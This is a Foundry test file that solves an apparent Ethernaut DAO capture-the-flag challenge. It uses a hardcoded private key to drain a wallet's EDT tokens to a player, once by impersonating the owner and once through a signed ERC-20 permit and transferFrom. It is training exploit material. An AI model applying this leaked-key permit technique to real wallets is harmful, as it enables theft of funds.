// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/EthernautDaoToken.sol";

contract EthernautDaoTokenTest is BaseTest {
    EthernautDaoToken private ethernautDaoToken;
    uint256 private constant WALLET_PRIVATE_KEY =
        uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);

    constructor() {
        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(1, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        ethernautDaoToken = EthernautDaoToken(payable(0xF3Cfa05F1eD0F5eB7A8080f1109Ad7E424902121));
        vm.label(address(ethernautDaoToken), "EthernautDaoToken");
    }

    function testTransferEDTToken() public {
        address player = users[0];

        address walletAddress = vm.addr(WALLET_PRIVATE_KEY);
        uint256 walletBalanceBefore = ethernautDaoToken.balanceOf(walletAddress);

        // Solution 1: access directly as the final user
        solutionOne(walletAddress, player, walletBalanceBefore / 2);

        // Solution 2: Use the Permit functions to allow the player to transfer the tokens on behalf of the user
        solutionTwo(walletAddress, player, ethernautDaoToken.balanceOf(walletAddress));

        assertEq(ethernautDaoToken.balanceOf(player), walletBalanceBefore);
        assertEq(ethernautDaoToken.balanceOf(walletAddress), 0);
    }

    /// @notice Solution 1: access directly as the final user
    function solutionOne(
        address walletAddress,
        address player,
        uint256 walletBalance
    ) private {
        vm.startPrank(walletAddress);
        ethernautDaoToken.transfer(player, walletBalance);
        vm.stopPrank();
    }

    /// @notice Solution 1: access directly as the final user
    function solutionTwo(
        address walletAddress,
        address player,
        uint256 walletBalance
    ) private {
        uint256 deadline = block.timestamp + 1;
        bytes32 permitTypeHash = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );
        bytes32 erc20PermitStructHash = keccak256(
            abi.encode(permitTypeHash, walletAddress, player, walletBalance, 0, deadline)
        );
        bytes32 erc20PermitHash = ECDSA.toTypedDataHash(ethernautDaoToken.DOMAIN_SEPARATOR(), erc20PermitStructHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(WALLET_PRIVATE_KEY, erc20PermitHash);

        ethernautDaoToken.permit(walletAddress, player, walletBalance, deadline, v, r, s);

        vm.startPrank(player);
        ethernautDaoToken.transferFrom(walletAddress, player, walletBalance);
        vm.stopPrank();
    }
}
